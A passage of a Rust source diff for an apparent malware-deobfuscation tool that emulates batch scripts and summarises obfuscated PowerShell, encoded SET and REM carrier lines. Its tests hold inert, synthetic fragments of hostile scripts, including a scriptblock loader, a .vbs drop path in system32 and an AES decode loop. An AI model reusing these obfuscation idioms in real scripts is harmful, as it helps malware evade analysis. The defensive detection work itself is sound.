+            if close_redir.stdout.is_some() || !close_cleaned.trim().is_empty() {
+                i = close + 1;
+                continue;
+            }
+            prefix_target
+        } else {
+            let (_, redir) = crate::redirect::extract_redirections(after_paren);
+            let Some(target) = redir.stdout else {
+                i = close + 1;
+                continue;
+            };
+            target
         };
         // Var-expand the redirect target — without this, `> "%_t%"` stores
         // the file under the literal key `%_t%`, but the following
         // `certutil -decode "%_t%" "%_b%"` arrives already var-expanded
         // (the dispatcher renders the line through normalize first), so
         // the lookup misses. (Contract_Project_Agreement family.)
-        let target_expanded = {
-            let raw_path = target.path();
-            if raw_path.contains('%') || raw_path.contains('!') {
-                let toks = lex::lex(raw_path);
-                normalize::normalize_to_string(&toks, &mut scratch)
-            } else {
-                raw_path.to_string()
-            }
-        };
+        let target_expanded = expand_redirect_path(target.path(), &mut scratch);
         let target = if target.append() {
             crate::redirect::RedirTarget::Append(target_expanded)
         } else {
@@ -3770,7 +5905,7 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
             return;
         }
         // Collect candidates first to avoid borrow conflicts.
-        let candidates: Vec<(String, Vec<u8>)> = env
+        let mut candidates: Vec<(String, Vec<u8>)> = env
             .modified_filesystem
             .iter()
             .filter_map(|(k, v)| {
@@ -3784,7 +5919,13 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
                 content.map(|c| (k.clone(), c))
             })
             .collect();
+        candidates.sort_by(|(left_dst, left_content), (right_dst, right_content)| {
+            left_dst
+                .cmp(right_dst)
+                .then_with(|| left_content.cmp(right_content))
+        });
 
+        let mut processed_any = false;
         for (dst, content) in candidates {
             if !looks_like_batch(&content) {
                 continue;
@@ -3793,6 +5934,7 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
             if !seen.insert(fp) {
                 continue;
             }
+            processed_any = true;
             env.traits.push(Trait::RecursiveAnalysis {
                 dst: dst.clone(),
                 depth,
@@ -3837,7 +5979,12 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
             deob_scan::scan_deob_text(&decoded_text, env);
             deob_scan::scan_deob_text(&child_out, env);
             deob_scan::scan_embedded_powershell_invocations(&decoded_text, env);
-            // After recursion, check if new decoded files appeared (depth+1 cap).
+        }
+
+        // After all current-depth siblings are processed, check whether any of
+        // them produced new decoded files. This keeps sibling ordering and
+        // depth reporting independent of hash-map iteration order.
+        if processed_any {
             walk(env, out, depth + 1, seen);
         }
     }
@@ -3882,6 +6029,12 @@ fn has_disable_delayed_expansion(input: &[u8]) -> bool {
 /// silently lose IOCs from single-line JS/PS payloads (the QF-Z2-MR family
 /// is one 582 KB JS line with `0zz0.com` URLs deep in the tail).
 fn cap_line(line: String, env: &mut Environment) -> String {
+    if let Some(summary) = summarize_base64_pe_carrier_line(&line) {
+        return summary;
+    }
+    if let Some(summary) = summarize_high_unicode_carrier_line(&line, env) {
+        return summary;
+    }
     let limit = env.limits.max_output_line_bytes;
     if limit == 0 || line.len() as u64 <= limit {
         return line;
@@ -3905,6 +6058,120 @@ fn cap_line(line: String, env: &mut Environment) -> String {
     let mut s = line[..end].to_string();
     s.push_str("…[truncated]");
     s
+}
+
+fn summarize_high_unicode_carrier_line(line: &str, env: &mut Environment) -> Option<String> {
+    const MIN_HIGH_UNICODE_CHARS: usize = 1024;
+    const MAX_CONTEXT_BYTES: usize = 512;
+
+    let lower = line.to_ascii_lowercase();
+    if !has_high_unicode_carrier_context(&lower) {
+        return None;
+    }
+
+    let high_unicode_chars = line
+        .chars()
+        .filter(|ch| matches!(*ch as u32, 0x4e00..=0x9fff))
+        .count();
+    if high_unicode_chars < MIN_HIGH_UNICODE_CHARS {
+        return None;
+    }
+
+    let truncated = input_has_truncation_marker(line.as_bytes());
+    let metadata = high_unicode_payload_metadata(line, high_unicode_chars as u64);
+    if !env.traits.iter().any(|t| {
+        matches!(
+            t,
+            crate::traits::Trait::HighUnicodePayload {
+                char_count,
+                truncated: existing_truncated,
+                ..
+            } if *char_count == high_unicode_chars as u64 && *existing_truncated == truncated
+        )
+    }) {
+        env.traits.push(crate::traits::Trait::HighUnicodePayload {
+            char_count: high_unicode_chars as u64,
+            truncated,
+            byte_carrier_base: metadata.byte_carrier_base,
+            byte_count: metadata.byte_count,
+        });
+    }
+
+    let truncated_label = if truncated { "truncated " } else { "" };
+    let summary = format!(
+        "::==== harrington: omitted {high_unicode_chars} high-Unicode chars from {truncated_label}PowerShell carrier ===="
+    );
+
+    let mut first_high = None;
+    let mut last_high_end = None;
+    for (idx, ch) in line.char_indices() {
+        if matches!(ch as u32, 0x4e00..=0x9fff) {
+            first_high.get_or_insert(idx);
+            last_high_end = Some(idx + ch.len_utf8());
+        }
+    }
+
+    let Some(first_high) = first_high else {
+        return Some(summary);
+    };
+    let Some(last_high_end) = last_high_end else {
+        return Some(summary);
+    };
+
+    let prefix = truncate_context_prefix(&line[..first_high], MAX_CONTEXT_BYTES);
+    let suffix = truncate_context_suffix(&line[last_high_end..], MAX_CONTEXT_BYTES);
+    Some(format!("{prefix}{summary}{suffix}"))
+}
+
+fn has_high_unicode_carrier_context(lower: &str) -> bool {
+    lower.contains("scriptblock")
+        || lower.contains("powershell")
+        || (lower.contains("aesmanaged") && lower.contains("[uint16]") && lower.contains("[char]"))
+}
+
+fn truncate_context_prefix(context: &str, max_bytes: usize) -> &str {
+    if context.len() <= max_bytes {
+        return context;
+    }
+    let mut start = context.len().saturating_sub(max_bytes);
+    while start < context.len() && !context.is_char_boundary(start) {
+        start += 1;
+    }
+    &context[start..]
+}
+
+fn truncate_context_suffix(context: &str, max_bytes: usize) -> &str {
+    if context.len() <= max_bytes {
+        return context;
+    }
+    let mut end = max_bytes.min(context.len());
+    while end > 0 && !context.is_char_boundary(end) {
+        end -= 1;
+    }
+    &context[..end]
+}
+
+fn summarize_high_unicode_carrier_lines(text: &str, env: &mut Environment) -> String {
+    if !text.chars().any(|ch| matches!(ch as u32, 0x4e00..=0x9fff)) {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(4096));
+    for segment in text.split_inclusive('\n') {
+        let (line, eol) = segment
+            .strip_suffix('\n')
+            .map_or((segment, ""), |without_lf| (without_lf, "\n"));
+        let line = line.strip_suffix('\r').unwrap_or(line);
+        let cr = if segment.ends_with("\r\n") { "\r" } else { "" };
+        if let Some(summary) = summarize_high_unicode_carrier_line(line, env) {
+            out.push_str(&summary);
+        } else {
+            out.push_str(line);
+        }
+        out.push_str(cr);
+        out.push_str(eol);
+    }
+    out
 }
 
 fn summarize_expanded_long_alpha_echo_line(line: &str, env: &mut Environment) -> Option<String> {
@@ -3984,18 +6251,35 @@ fn fast_expand_percent_substr_chain_line(line: &str, env: &Environment) -> Optio
 
         let name_start = cursor + 1;
         let after_start = &line[name_start..];
-        let colon_rel = after_start.find(':')?;
+        let close_rel = after_start.find('%')?;
+        let colon_rel = after_start.find(':');
+        let Some(colon_rel) = colon_rel.filter(|colon_rel| *colon_rel < close_rel) else {
+            let name_end = name_start + close_rel;
+            if name_end == name_start {
+                return None;
+            }
+            let name = &line[name_start..name_end];
+            if name.contains(['!', '^', '&', '|', '<', '>', '"']) {
+                return None;
+            }
+            if let Some(value) = env.get(name) {
+                out.push_str(&value);
+            }
+            refs += 1;
+            cursor = name_end + 1;
+            continue;
+        };
+
         let name_end = name_start + colon_rel;
         if name_end == name_start {
             return None;
         }
         let op_start = name_end + 1;
-        let op_rest = &line[op_start..];
+        let op_end = name_start + close_rel;
+        let op_rest = &line[op_start..op_end];
         if !op_rest.trim_start().starts_with('~') {
             return None;
         }
-        let close_rel = op_rest.find('%')?;
-        let op_end = op_start + close_rel;
         let op = &line[op_start..op_end];
         let crate::lex::VarOp::Substr { index, length } = crate::lex::parse_substr(op)? else {
             return None;
@@ -4242,6 +6526,25 @@ fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String
     out
 }
 
+fn summarize_encoded_set_carrier_line_runs(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_encoded_set_carrier_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_encoded_set_carrier_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    flush_encoded_set_carrier_run(&mut out, &mut pending, &mut pending_lines, env);
+    out
+}
+
 fn summarize_nul_padding_lines(text: &str, env: &mut Environment) -> String {
     const MIN_NUL_PADDING_BYTES: usize = 1024;
 
@@ -4411,6 +6714,29 @@ fn flush_binary_noise_run(
     *pending_lines = 0;
 }
 
+fn flush_encoded_set_carrier_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= 16 && pending.len() >= 16 * 1024 {
+        rescue_truncated_urls(pending, pending.len(), env);
+        out.push_str(&format!(
+            "::==== harrington: omitted {} encoded SET carrier lines ({} bytes) ====\r\n",
+            *pending_lines,
+            pending.len()
+        ));
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
 fn is_binary_noise_line(line: &str) -> bool {
     let trimmed = line.trim();
     if trimmed.is_empty() || trimmed.len() < 4 {
@@ -4424,10 +6750,160 @@ fn is_binary_noise_line(line: &str) -> bool {
     suspicious * 3 >= bytes.len()
 }
 
+fn is_encoded_set_carrier_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    let bytes = trimmed.as_bytes();
+    if bytes.len() < 4
+        || !bytes[0].eq_ignore_ascii_case(&b's')
+        || !bytes[1].eq_ignore_ascii_case(&b'e')
+        || !bytes[2].eq_ignore_ascii_case(&b't')
+        || !bytes[3].is_ascii_whitespace()
+    {
+        return false;
+    }
+    let rest = trimmed[4..].trim_start();
+    let Some((_, value)) = rest.split_once('=') else {
+        return false;
+    };
+    let value = value.trim().trim_matches('"').trim();
+    if value.len() < 256 {
+        return false;
+    }
+
+    let mut encoded = 0usize;
+    let mut marker = 0usize;
+    let mut other = 0usize;
+    for ch in value.chars() {
+        if ch.is_ascii_alphanumeric() || matches!(ch, '+' | '/' | '=' | '-' | '_') {
+            encoded += 1;
+        } else if !ch.is_ascii() {
+            marker += ch.len_utf8();
+        } else if ch.is_ascii_whitespace() {
+            continue;
+        } else {
+            other += 1;
+        }
+    }
+    let total = encoded + marker + other;
+    total >= 256 && encoded * 100 >= total * 85 && other * 100 <= total * 5
+}
+
 fn contains_rem_comment_candidate(text: &str) -> bool {
     text.as_bytes()
         .windows(4)
         .any(|w| matches!(w, [b'r' | b'R', b'e' | b'E', b'm' | b'M', b' ']))
+}
+
+fn caret_obfuscated_rem_payload(line: &str) -> Option<(&str, &str)> {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
+    let leading = &line[..line.len() - trimmed.len()];
+    let bytes = trimmed.as_bytes();
+    let mut i = 0usize;
+    let mut saw_caret = false;
+    for expected in [b'r', b'e', b'm'] {
+        if bytes.get(i) == Some(&b'^') {
+            saw_caret = true;
+            i += 1;
+        }
+        let b = *bytes.get(i)?;
+        if !b.eq_ignore_ascii_case(&expected) {
+            return None;
+        }
+        i += 1;
+    }
+    if !saw_caret {
+        return None;
+    }
+    match bytes.get(i) {
+        None => Some((leading, "")),
+        Some(b' ' | b'\t') => Some((leading, trimmed[i..].trim_start_matches([' ', '\t']))),
+        _ => None,
+    }
+}
+
+fn render_long_rem_comment_summary(leading: &str, payload: &str, out: &mut String) {
+    out.push_str(leading);
+    out.push_str("rem ::==== harrington: omitted ");
+    out.push_str(&payload.len().to_string());
+    out.push_str(" bytes from long REM comment line ====\r\n");
+}
+
+fn self_read_base64_match_markers(input: &[u8]) -> Vec<String> {
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("-match") || !lower.contains("frombase64string") {
+        return Vec::new();
+    }
+
+    let mut out = Vec::new();
+    let mut cursor = 0usize;
+    while let Some(rel) = lower[cursor..].find("-match") {
+        let after_match = cursor + rel + "-match".len();
+        let Some(quote_rel) = text[after_match..].find(['\'', '"']) else {
+            break;
+        };
+        let quote_start = after_match + quote_rel;
+        let quote = text.as_bytes()[quote_start] as char;
+        let pattern_start = quote_start + quote.len_utf8();
+        let Some(pattern_end_rel) = text[pattern_start..].find(quote) else {
+            break;
+        };
+        let pattern = &text[pattern_start..pattern_start + pattern_end_rel];
+        if let Some(marker) = self_read_base64_marker_from_pattern(pattern) {
+            if !out.iter().any(|existing| existing == marker) {
+                out.push(marker.to_string());
+            }
+        }
+        cursor = pattern_start + pattern_end_rel + quote.len_utf8();
+    }
+    out
+}
+
+fn self_read_base64_marker_from_pattern(pattern: &str) -> Option<&str> {
+    let marker = pattern.strip_suffix("([A-Za-z0-9+/=]+)")?;
+    if (4..=200).contains(&marker.len())
+        && marker
+            .bytes()
+            .all(|b| b.is_ascii_graphic() && !matches!(b, b'(' | b')' | b'[' | b']'))
+    {
+        Some(marker)
+    } else {
+        None
+    }
+}
+
+fn summarize_self_read_base64_marker_line(
+    line: &str,
+    markers: &[String],
+    env: &mut Environment,
+    out: &mut String,
+) -> bool {
+    const MIN_MARKER_B64_BYTES: usize = 1024;
+
+    if markers.is_empty() || line.len() < MIN_MARKER_B64_BYTES {
+        return false;
+    }
+    let trimmed = line.trim_start();
+    let leading = &line[..line.len() - trimmed.len()];
+    for marker in markers {
+        let Some(b64) = trimmed.strip_prefix(marker) else {
+            continue;
+        };
+        if b64.len() < MIN_MARKER_B64_BYTES || !b64.bytes().all(is_base64_byte) {
+            continue;
+        }
+        out.push_str(leading);
+        out.push_str(&format!(
+            "::==== harrington: omitted self-read base64 marker payload (marker {} bytes, {} bytes encoded) ====\r\n",
+            marker.len(),
+            b64.len()
+        ));
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: line.len() as u64,
+        });
+        return true;
+    }
+    false
 }
 
 fn split_line_ending(line: &str) -> (&str, &str) {
@@ -4465,14 +6941,44 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
     }
     env.limits.depth += 1;
 
-    let lines = line_reader::read_logical_lines(input);
+    let drive_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_DRIVE").is_some();
+    let drive_profile_start = std::time::Instant::now();
+    let mut profile_read_lines_us = 0u128;
+    let mut profile_redirect_capture_us = 0u128;
+    let mut profile_label_index_us = 0u128;
+    let mut profile_fast_expand_us = 0u128;
+    let mut profile_split_us = 0u128;
+    let mut profile_pre_dispatch_us = 0u128;
+    let mut profile_normalize_us = 0u128;
+    let mut profile_interpret_us = 0u128;
+    let mut profile_output_us = 0u128;
+    let mut profile_iter_output_us = 0u128;
+    let mut profile_child_drain_us = 0u128;
+    let mut profile_command_count = 0usize;
+
+    let lines = if drive_profile_enabled {
+        let start = std::time::Instant::now();
+        let lines = line_reader::read_logical_lines(input);
+        profile_read_lines_us += start.elapsed().as_micros();
+        lines
+    } else {
+        line_reader::read_logical_lines(input)
+    };
+    let self_read_b64_markers = self_read_base64_match_markers(input);
     // Pre-scan grouped-output redirects: `( echo A\n echo B\n ) > "file"`.
     // The redirect applies to the whole block's stdout, but each echo line is
     // processed independently in the main loop, so without this the file is
     // never populated. Capturing it up front lets certutil -decode / call
     // resolve the written file. Safe to run before the main loop: the close
     // `)` redirect line is a block delimiter and never re-writes the file.
-    let captured_echo_blocks = capture_block_echo_redirects(&lines, env);
+    let echo_redirect_shapes = echo_redirect_prescan_shapes(input);
+    let redirect_capture_start = drive_profile_enabled.then(std::time::Instant::now);
+    let captured_echo_blocks =
+        if echo_redirect_shapes.grouped_block && input.contains(&b'(') && input.contains(&b')') {
+            capture_block_echo_redirects(&lines, env)
+        } else {
+            Vec::new()
+        };
     let collapsed_echo_blocks: std::collections::HashMap<usize, CapturedEchoBlock> =
         captured_echo_blocks
             .into_iter()
@@ -4480,13 +6986,26 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             .map(|block| (block.open_idx, block))
             .collect();
     let collapsed_echo_runs: std::collections::HashMap<usize, CapturedEchoRun> =
-        capture_top_level_echo_redirect_runs(&lines, env)
-            .into_iter()
-            .map(|run| (run.start_idx, run))
-            .collect();
+        if echo_redirect_shapes.top_level_run {
+            capture_top_level_echo_redirect_runs(&lines, env)
+                .into_iter()
+                .map(|run| (run.start_idx, run))
+                .collect()
+        } else {
+            std::collections::HashMap::new()
+        };
+    if let Some(start) = redirect_capture_start {
+        profile_redirect_capture_us += start.elapsed().as_micros();
+    }
     // Save the caller's label_index and install one for this script frame.
     let prior_labels = std::mem::take(&mut env.label_index);
-    env.label_index = labels::build_label_index(&lines);
+    if drive_profile_enabled {
+        let start = std::time::Instant::now();
+        env.label_index = labels::build_label_index(&lines);
+        profile_label_index_us += start.elapsed().as_micros();
+    } else {
+        env.label_index = labels::build_label_index(&lines);
+    }
 
     let mut cursor = 0usize;
     // High-water mark: the furthest line index we have linearly advanced past.
@@ -4506,6 +7025,11 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
 
         env.current_line = Some(cursor);
         let logical = &lines[cursor];
+
+        if summarize_self_read_base64_marker_line(logical, &self_read_b64_markers, env, out) {
+            cursor += 1;
+            continue;
+        }
 
         if let Some((end_idx, marker)) = large_pem_block_summary_at(&lines, cursor) {
             out.push_str(logical);
@@ -4536,6 +7060,16 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             ));
             cursor = run.end_idx + 1;
             continue;
+        }
+
+        if let Some((leading, payload)) = caret_obfuscated_rem_payload(logical) {
+            const MIN_SUMMARY_BYTES: usize = 1024;
+            if payload.len() >= MIN_SUMMARY_BYTES {
+                rescue_truncated_urls(payload, logical.len(), env);
+                render_long_rem_comment_summary(leading, payload, out);
+                cursor += 1;
+                continue;
+            }
         }
 
         // Label-only lines and `rem` comments aren't interpreted, but we
@@ -4597,28 +7131,62 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
         // When true, we advance past the high-water mark to avoid re-executing
         // subroutine bodies that were already visited via a call.
         let mut top_level_exit = false;
+        let fast_expand_start = drive_profile_enabled.then(std::time::Instant::now);
         let fast_normalized = if env.suppress_until_eol {
             None
         } else {
             fast_expand_percent_substr_chain_line(logical, env)
                 .or_else(|| fast_expand_percent_var_chain_line(logical, env))
         };
+        if let Some(start) = fast_expand_start {
+            profile_fast_expand_us += start.elapsed().as_micros();
+        }
 
-        'cmds: for cmd in split::split_commands(logical) {
+        let commands = if drive_profile_enabled {
+            let start = std::time::Instant::now();
+            let commands = split::split_commands(logical);
+            profile_split_us += start.elapsed().as_micros();
+            commands
+        } else {
+            split::split_commands(logical)
+        };
+        profile_command_count += commands.len();
+        'cmds: for cmd in commands {
             if env.suppress_until_eol {
                 // Render the suppressed command (for visibility) but skip dispatch.
-                let toks = lex::lex(&cmd);
-                let normalized = normalize::normalize_to_string(&toks, env);
+                let normalized = if drive_profile_enabled {
+                    let start = std::time::Instant::now();
+                    let normalized = normalize::normalize_literal_command_fast(&cmd)
+                        .unwrap_or_else(|| {
+                            let toks = lex::lex(&cmd);
+                            normalize::normalize_to_string(&toks, env)
+                        });
+                    profile_normalize_us += start.elapsed().as_micros();
+                    normalized
+                } else {
+                    normalize::normalize_literal_command_fast(&cmd).unwrap_or_else(|| {
+                        let toks = lex::lex(&cmd);
+                        normalize::normalize_to_string(&toks, env)
+                    })
+                };
+                let output_start = drive_profile_enabled.then(std::time::Instant::now);
                 let normalized_capped = cap_line(normalized, env);
                 out.push_str(&normalized_capped);
                 out.push_str("\r\n");
+                if let Some(start) = output_start {
+                    profile_output_us += start.elapsed().as_micros();
+                }
                 continue;
             }
 
             if let Some(rendered) = render_fast_long_plain_echo(&cmd, env) {
                 if !line_output_elided {
+                    let output_start = drive_profile_enabled.then(std::time::Instant::now);
                     out.push_str(&rendered);
                     out.push_str("\r\n");
+                    if let Some(start) = output_start {
+                        profile_output_us += start.elapsed().as_micros();
+                    }
                 }
                 if env.limits.max_output_bytes > 0
                     && (out.len() as u64) >= env.limits.max_output_bytes
@@ -4640,31 +7208,57 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
 
             // Single pre-normalize dispatch hook: handles FOR loops (raw %%A)
             // and cmd /c child extraction (raw var refs) in one typed call.
-            let pre = interp::pre_dispatch(&cmd, env);
+            let pre = if drive_profile_enabled {
+                let start = std::time::Instant::now();
+                let pre = interp::pre_dispatch(&cmd, env);
+                profile_pre_dispatch_us += start.elapsed().as_micros();
+                pre
+            } else {
+                interp::pre_dispatch(&cmd, env)
+            };
 
             let normalized = if let Some(fast) = fast_normalized.as_ref() {
                 fast.clone()
             } else {
-                let toks = lex::lex(&cmd);
-                normalize::normalize_to_string(&toks, env)
+                let normalize_start = drive_profile_enabled.then(std::time::Instant::now);
+                let normalized =
+                    normalize::normalize_literal_command_fast(&cmd).unwrap_or_else(|| {
+                        let toks = lex::lex(&cmd);
+                        normalize::normalize_to_string(&toks, env)
+                    });
+                if let Some(start) = normalize_start {
+                    profile_normalize_us += start.elapsed().as_micros();
+                }
+                normalized
             };
             env.pending_action = None;
             // Only dispatch via interpret_line if NOT already consumed by pre_dispatch.
             if !pre.consumed {
-                interp::interpret_line(&normalized, env);
+                if drive_profile_enabled {
+                    let start = std::time::Instant::now();
+                    interp::interpret_line(&normalized, env);
+                    profile_interpret_us += start.elapsed().as_micros();
+                } else {
+                    interp::interpret_line(&normalized, env);
+                }
             }
             // Goto-loop output elision: visit count is tracked per source
             // line above; suppress the deob append once the line has been
             // visited more than GOTO_LOOP_ELIDE_AFTER times. Handlers
             // still run, so IOCs aren't lost.
             if !line_output_elided {
+                let output_start = drive_profile_enabled.then(std::time::Instant::now);
                 let normalized_capped = cap_line(normalized, env);
                 out.push_str(&normalized_capped);
                 out.push_str("\r\n");
+                if let Some(start) = output_start {
+                    profile_output_us += start.elapsed().as_micros();
+                }
             }
 
             // Collect any output produced by FOR-loop body iterations.
             if !env.iter_output.is_empty() {
+                let iter_output_start = drive_profile_enabled.then(std::time::Instant::now);
                 let iter_out = std::mem::take(&mut env.iter_output);
                 // Apply per-line cap to each line in iter_output.
                 for iter_line in iter_out.split("\r\n") {
@@ -4674,6 +7268,9 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
                     let capped = cap_line(iter_line.to_string(), env);
                     out.push_str(&capped);
                     out.push_str("\r\n");
+                }
+                if let Some(start) = iter_output_start {
+                    profile_iter_output_us += start.elapsed().as_micros();
                 }
             }
 
@@ -4736,6 +7333,7 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             }
 
             // Drain any newly-queued child scripts.
+            let child_drain_start = drive_profile_enabled.then(std::time::Instant::now);
             let pending_cmd: Vec<String> = std::mem::take(&mut env.exec_cmd);
             let pending_cmd_delayed: Vec<bool> = std::mem::take(&mut env.exec_cmd_delayed);
             let pending_ps1: Vec<Vec<u8>> = std::mem::take(&mut env.exec_ps1);
@@ -4778,6 +7376,9 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
                 // Restore delayed expansion to the parent's state after the child.
                 env.delayed_expansion = saved_delayed;
             }
+            if let Some(start) = child_drain_start {
+                profile_child_drain_us += start.elapsed().as_micros();
+            }
         }
 
         env.suppress_until_eol = false;
@@ -4796,7 +7397,96 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
 
     // Restore caller's label_index.
     env.label_index = prior_labels;
+    if drive_profile_enabled {
+        eprintln!(
+            "harrington_profile_drive depth={} lines={} commands={} bytes={} out_bytes={} total_ms={} read_lines_ms={} redirect_capture_ms={} label_index_ms={} fast_expand_ms={} split_ms={} pre_dispatch_ms={} normalize_ms={} interpret_ms={} output_ms={} iter_output_ms={} child_drain_ms={}",
+            env.limits.depth,
+            lines.len(),
+            profile_command_count,
+            input.len(),
+            out.len(),
+            drive_profile_start.elapsed().as_millis(),
+            profile_read_lines_us / 1000,
+            profile_redirect_capture_us / 1000,
+            profile_label_index_us / 1000,
+            profile_fast_expand_us / 1000,
+            profile_split_us / 1000,
+            profile_pre_dispatch_us / 1000,
+            profile_normalize_us / 1000,
+            profile_interpret_us / 1000,
+            profile_output_us / 1000,
+            profile_iter_output_us / 1000,
+            profile_child_drain_us / 1000
+        );
+    }
     env.limits.depth -= 1;
+}
+
+fn input_contains_ascii_case_insensitive(input: &[u8], needle: &[u8]) -> bool {
+    !needle.is_empty()
+        && input.windows(needle.len()).any(|window| {
+            window
+                .iter()
+                .zip(needle)
+                .all(|(byte, needle_byte)| byte.eq_ignore_ascii_case(needle_byte))
+        })
+}
+
+fn input_has_truncation_marker(input: &[u8]) -> bool {
+    input
+        .windows(b"...[truncated]".len())
+        .any(|window| window.eq_ignore_ascii_case(b"...[truncated]"))
+        || input
+            .windows("…[truncated]".len())
+            .any(|window| window.eq_ignore_ascii_case("…[truncated]".as_bytes()))
+}
+
+#[derive(Clone, Copy)]
+struct HighUnicodePayloadMetadata {
+    char_count: u64,
+    byte_carrier_base: Option<u32>,
+    byte_count: Option<u64>,
+}
+
+fn truncated_high_unicode_payload_metadata(input: &[u8]) -> Option<HighUnicodePayloadMetadata> {
+    let text = String::from_utf8_lossy(input);
+    if !input_contains_ascii_case_insensitive(input, b"scriptblock")
+        && !input_contains_ascii_case_insensitive(input, b"powershell")
+    {
+        return None;
+    }
+
+    let count = text
+        .chars()
+        .filter(|ch| matches!(*ch as u32, 0x4e00..=0x9fff))
+        .count();
+    (count >= 1024).then(|| high_unicode_payload_metadata(&text, count as u64))
+}
+
+fn high_unicode_payload_metadata(text: &str, char_count: u64) -> HighUnicodePayloadMetadata {
+    let mut min_codepoint = u32::MAX;
+    let mut max_codepoint = 0u32;
+    for codepoint in text
+        .chars()
+        .map(|ch| ch as u32)
+        .filter(|codepoint| matches!(*codepoint, 0x4e00..=0x9fff))
+    {
+        min_codepoint = min_codepoint.min(codepoint);
+        max_codepoint = max_codepoint.max(codepoint);
+    }
+
+    let (byte_carrier_base, byte_count) =
+        if min_codepoint != u32::MAX && max_codepoint.saturating_sub(min_codepoint) <= 255 {
+            (Some(min_codepoint), Some(char_count))
+        } else {
+            (None, None)
+        };
+
+    HighUnicodePayloadMetadata {
+        char_count,
+        byte_carrier_base,
+        byte_count,
+    }
 }
 
 #[cfg(test)]
@@ -4884,6 +7574,146 @@ mod line_cap_tests {
             .iter()
             .any(|t| matches!(t, Trait::LineTruncated { .. }));
         assert!(trunc, "no LineTruncated trait emitted");
+    }
+
+    #[test]
+    fn sandbox_truncated_input_marker_emits_line_truncated() {
+        let script = format!(
+            "&([scriptblock]::Create($x=({}...[truncated]",
+            "亓".repeat(4096)
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { original_len } if *original_len == script.len() as u64)),
+            "sandbox-capped input marker should be surfaced as LineTruncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn sandbox_truncated_high_unicode_payload_emits_specific_trait() {
+        let script = format!(
+            "&([scriptblock]::Create($payload=({});$i=0;...[truncated]",
+            "亓亮亊乑乑予之亖丱乵亞以仃仉产乆".repeat(256)
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::HighUnicodePayload {
+                        char_count,
+                        truncated: true,
+                        ..
+                    } if *char_count >= 4096
+                )
+            }),
+            "sandbox-capped high-Unicode carrier should be surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn sandbox_truncated_high_unicode_payload_reports_byte_carrier_metadata() {
+        let carrier: String = (0..2048)
+            .map(|idx| char::from_u32(0x4e00 + (idx % 256)).unwrap())
+            .collect();
+        let script = format!(
+            "&([scriptblock]::Create($drop=C:\\Windows\\system32\\rWhatsAppImage2026-05-12at12_37_26.vbs;$payload=({carrier});...[truncated]"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+        let value = serde_json::to_value(
+            report
+                .traits
+                .iter()
+                .find(|t| matches!(t, Trait::HighUnicodePayload { .. }))
+                .expect("missing high-Unicode payload trait"),
+        )
+        .expect("serialize trait");
+
+        assert_eq!(
+            value.get("byte_carrier_base").and_then(|v| v.as_u64()),
+            Some(0x4e00),
+            "high-Unicode byte carrier base was not reported: {value:?}"
+        );
+        assert_eq!(
+            value.get("byte_count").and_then(|v| v.as_u64()),
+            Some(2048),
+            "high-Unicode byte count was not reported: {value:?}"
+        );
+    }
+
+    #[test]
+    fn sandbox_truncated_high_unicode_payload_is_summarized_in_deob_text() {
+        let carrier = "亓亮亊乑乑予之亖丱乵亞以仃仉产乆".repeat(256);
+        let script = format!("&([scriptblock]::Create($payload=({carrier});$i=0;...[truncated]");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 4096 high-Unicode chars from truncated PowerShell carrier"),
+            "high-Unicode carrier was not summarized: {}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&carrier),
+            "opaque carrier should not be dumped into deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn normalized_high_unicode_aes_payload_is_summarized_in_deob_text() {
+        let carrier = "亓亮亊乑乑予之亖丱乵亞以仃仉产乆".repeat(256);
+        let script = format!(
+            "$payload=('{carrier}');$bytes=New-Object byte[] $payload.Length;\
+             for($i=0;$i -lt $payload.Length;$i++){{$bytes[$i]=[byte](([uint16][char]$payload[$i])-19968)}};\
+             $aes=New-Object System.Security.Cryptography.AesManaged;\
